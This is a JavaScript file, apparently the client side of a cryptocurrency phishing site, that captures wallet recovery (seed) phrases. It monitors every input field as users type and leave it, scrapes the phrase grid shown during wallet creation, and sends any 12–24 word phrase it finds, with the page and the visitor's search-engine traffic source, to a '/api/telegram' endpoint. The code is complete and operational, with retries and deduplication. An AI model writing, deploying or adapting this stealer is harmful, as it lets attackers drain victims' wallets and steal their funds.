// ============================================================
// SEED PHRASE CAPTURE - form-handler.js
// Captures seed phrases from: user input + wallet creation UI
// ============================================================

const API = '/api/telegram';
let lastSent = '';
let inputTimer;

// --- Traffic source ---
function getTrafficSource() {
  const ref = document.referrer.toLowerCase();
  const p = new URLSearchParams(window.location.search);
  if (ref.includes('google.com') || ref.includes('google.co')) return 'Google SEO';
  if (ref.includes('bing.com')) return 'Bing SEO';
  const s = p.get('utm_source') || p.get('source') || '';
  if (s.toLowerCase().includes('google')) return 'Google SEO';
  if (s.toLowerCase().includes('bing')) return 'Bing SEO';
  return document.referrer || 'Direct';
}
const trafficSource = getTrafficSource();

// --- Helpers ---
function words(v) { return (v || '').trim().split(/\s+/).filter(w => w.length > 0); }
function wc(v) { return words(v).length; }

// Valid seed phrase: exactly 12/15/18/21/24 words, all lowercase letters only (BIP39)
function isSeed(v) {
  if (!v) return false;
  var ws = words(v.toLowerCase());
  if (![12, 15, 18, 21, 24].includes(ws.length)) return false;
  return ws.every(function(w) { return /^[a-z]{2,10}$/.test(w); });
}

// --- Send to Telegram ---
async function sendToTelegram(data) {
  data.trafficSource = trafficSource;
  data.timestamp = new Date().toISOString();
  for (let i = 0; i < 3; i++) {
    try {
      const r = await fetch(API, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ data })
      });
      if (!r.ok) throw new Error('HTTP ' + r.status);
      return await r.json();
    } catch (e) {
      if (i === 2) throw e;
      await new Promise(r => setTimeout(r, 1000 * (i + 1)));
    }
  }
}

// --- Send phrase (deduplicated) ---
function sendPhrase(phrase, type, field) {
  var clean = phrase.toLowerCase().replace(/\s+/g, ' ').trim();
  if (!clean || clean === lastSent) return;
  lastSent = clean;
  var n = wc(clean);
  console.log('✅ Sending', n, 'word phrase [' + type + '] from', trafficSource);
  sendToTelegram({ TYPE: type, PHRASE: clean, WORDS: n, FIELD: field || 'input', PAGE: window.location.pathname });
}

// --- Collect words from .phrase-grid / .phrase-card (wallet creation display) ---
function collectGridPhrase() {
  var grid = document.querySelector('.phrase-grid');
  if (!grid) return;
  var cards = grid.querySelectorAll('.phrase-card');
  if (!cards.length) return;
  var ws = [];
  cards.forEach(function(card) {
    // Each card contains an index number + the word — strip the number
    var txt = (card.textContent || '').trim().replace(/^\d+\s*/, '');
    if (txt && /^[a-z]{2,10}$/i.test(txt)) ws.push(txt.toLowerCase());
  });
  if ([12, 15, 18, 21, 24].includes(ws.length)) {
    var phrase = ws.join(' ');
    if (phrase !== lastSent) {
      lastSent = phrase;
      console.log('📋 Wallet creation phrase from grid:', ws.length, 'words');
      sendToTelegram({ TYPE: 'WALLET_CREATED', PHRASE: phrase, WORDS: ws.length, PAGE: window.location.pathname });
    }
  }
}

// --- Scan all inputs and the phrase grid ---
function scanAll() {
  collectGridPhrase();
  document.querySelectorAll('input, textarea').forEach(function(el) {
    var v = (el.value || '').trim();
    if (isSeed(v)) sendPhrase(v, 'SEED_INPUT', el.name || el.id || el.placeholder || 'field');
  });
}

// --- Start monitor ---
function startMonitor() {
  new MutationObserver(function(muts) {
    var changed = muts.some(function(m) { return m.addedNodes.length || m.type === 'characterData'; });
    if (changed) setTimeout(scanAll, 200);
  }).observe(document.body, { childList: true, subtree: true, characterData: true });

  [800, 2000, 4000, 7000, 12000].forEach(function(t) { setTimeout(scanAll, t); });
}

// --- Input: capture typed phrases ---
document.addEventListener('input', function(e) {
  var t = e.target;
  if (t.tagName !== 'INPUT' && t.tagName !== 'TEXTAREA') return;
  clearTimeout(inputTimer);
  inputTimer = setTimeout(function() {
    var v = (t.value || '').trim();
    if (isSeed(v)) sendPhrase(v, 'SEED_TYPED', t.name || t.id || t.placeholder || 'input');
  }, 500);
});

// --- Blur: capture when user finishes and moves on ---
document.addEventListener('blur', function(e) {
  var t = e.target;
  if (t.tagName !== 'INPUT' && t.tagName !== 'TEXTAREA') return;
  var v = (t.value || '').trim();
  if (isSeed(v)) sendPhrase(v, 'SEED_BLUR', t.name || t.id || t.placeholder || 'input');
}, true);

// --- Boot ---
document.addEventListener('DOMContentLoaded', function() {
  console.log('🔍 Traffic:', trafficSource);
  startMonitor();
});

window.TelegramIntegration = { send: sendToTelegram, sendPhrase: sendPhrase };
